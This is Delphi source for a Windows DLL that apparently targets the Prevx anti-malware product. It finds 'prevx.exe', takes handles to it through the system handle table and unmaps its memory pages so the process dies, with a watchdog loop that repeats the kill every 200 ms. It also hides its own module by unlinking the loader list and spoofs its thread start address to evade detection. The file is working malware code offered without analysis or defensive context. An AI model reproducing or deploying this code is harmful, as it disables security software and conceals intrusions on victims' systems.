{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program lib;
{$ENDIF}
unit lib;
interface

uses
  Windows, WinNative, RTL;


implementation

const
  String5: PWideChar = '\BaseNamedObjects\prevxfuck';
  ProcessesMaxID = 1;
  TargetProcesses: array[0..ProcessesMaxID] of PWideChar = ('prevx.exe', '');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  ProcessHandles: array[0..31] of THANDLE;
  ProcessesID: array[0..ProcessesMaxID] of DWORD;
  ProcessHandlesCount: integer = 0;

  SnapShotHandle: THANDLE;
  EventHandle: THANDLE;
  pBuffer: PROCESSENTRY32W;
  attr: OBJECT_ATTRIBUTES;
  str1: UNICODE_STRING;
  buf: array[0..PAGE_SIZE] of BYTE;
  buf1: LBuf;

function FillProcessesArray(): boolean;
var
  bFound: boolean;
  bytesIO: ULONG;
  buf: PSYSINFOBUF;
  last, i, c: integer;
  pbi: PROCESS_BASIC_INFORMATION;
begin
  result := false;

  ProcessHandlesCount := 0;
  memzero(@ProcessesID, sizeof(ProcessesID));
  memzero(@ProcessHandles, sizeof(ProcessHandles));

  last := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat

        for i := 0 to ProcessesMaxID - 1 do
        begin
          if (strcmpiW(pBuffer.szExeFile, TargetProcesses[i]) = 0) then
          begin
            ProcessesID[last] := pBuffer.th32ProcessID;
            inc(last);
          end;
        end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end else exit;

  bytesIO := 4194304;
  buf := nil;
  ZwAllocateVirtualMemory(DWORD(-1), @buf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (buf <> nil) then
  begin

    ZwQuerySystemInformation(SystemHandleInformation, buf, 4194304, @bytesIO);
    for c := 0 to Integer(buf^.uHandleCount) - 1 do
      if (buf^.rHandleTable[c].ProcessId = NtGetCurrentProcessId()) and (buf^.rHandleTable[c].ObjectTypeNumber = 5) then
      begin
        ProcessHandles[ProcessHandlesCount] := buf^.rHandleTable[c].Handle;

        bFound := false;
        if (ZwQueryInformationProcess(ProcessHandles[ProcessHandlesCount], ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO) = STATUS_SUCCESS) then
        begin

          for i := 0 to ProcessesMaxID do
            if (pbi.UniqueProcessId = ProcessesID[i]) then
            begin
              bFound := true;
              inc(ProcessHandlesCount);
              break;
            end;

        end;
        if not bFound then
          ProcessHandles[ProcessHandlesCount] := 0;

      end;
    bytesIO := 0;
    ZwFreeVirtualMemory(NtCurrentProcess, @buf, @bytesIO, MEM_RELEASE);
  end;
  result := (ProcessHandlesCount > 0);
end;

procedure KillProcesses();
var
  i: integer;
  p0: ULONG;
begin
  for i := 0 to ProcessHandlesCount - 1 do
  begin
    p0 := $40000000;
    repeat
      //uitohexW(p0, @buf1[0]);
      ZwUnmapViewOfSection(ProcessHandles[i], PVOID(p0));
      //if (ZwUnmapViewOfSection(ProcessHandles[i], PVOID(p0)) = STATUS_SUCCESS) then OutputDebugStringW(buf1);
      p0 := p0 + PAGE_SIZE;
    until (DWORD(p0) >= $80000000);
  end;
end;

function LdrHideDll(lpModule: PWideChar): THANDLE; stdcall;
var
  pTeb1: PTEB;
  f: LIST_ENTRY;
  cur: PLIST_ENTRY;
begin
  result := 0;
  asm
    mov eax, large fs:18h
    mov pTeb1, eax
  end;
  if (lpModule = nil) then
  begin
    result := Cardinal(pTeb1^.Peb^.ImageBaseAddress);
    exit;
  end;
  f := pTeb1^.Peb^.Ldr^.InLoadOrderModuleList;
  cur := f.Flink;
  while (true) do
  begin
    if (PLDR_MODULE(cur)^.EntryPoint <> nil) then
      if (PLDR_MODULE(cur)^.BaseDllName.PStr <> nil) and
        not IsBadReadPtr(PLDR_MODULE(cur)^.BaseDllName.PStr, PLDR_MODULE(cur)^.BaseDllName.Length) then
        if (strcmpiW(PLDR_MODULE(cur)^.BaseDllName.PStr, lpModule) = 0) then
        begin
          result := THANDLE(PLDR_MODULE(cur)^.DllBase);
          PLDR_MODULE(cur^.Blink)^.InLoadOrderModuleList.Flink :=
            PLDR_MODULE(cur)^.InLoadOrderModuleList.Flink;
          PLDR_MODULE(cur^.Flink)^.InLoadOrderModuleList.Blink :=
            PLDR_MODULE(cur)^.InLoadOrderModuleList.Blink;
          break;
        end;
    cur := cur^.Flink;
    if (cur = nil) or (cur = f.Flink) then break;
  end;
end;

function WatchDog(p1: pvoid): DWORD; stdcall;
begin
  result := 0;
  EventHandle := 0;
  RtlInitUnicodeString(@str1, String5);
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
  begin
    ZwSetEvent(EventHandle, nil);
    ZwClose(EventHandle);
  end;

  LdrHideDll('nel32.dll');
  EventHandle := DWORD(GetModuleHandle('winsrv.dll')) + $7CDF;
  ZwSetInformationThread(NtCurrentThread, ThreadQuerySetWin32StartAddress, @EventHandle, sizeof(DWORD));

  if FillProcessesArray() then
  begin
    KillProcesses();

    while true do
    begin
      NtSleep(200);
      if FillProcessesArray() then
        KillProcesses();
    end;

  end;
end;

procedure main();
var
  ThreadId: ULONG;
begin
  ZwClose(CreateThread(nil, 0, @WatchDog, nil, 0, ThreadId));
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

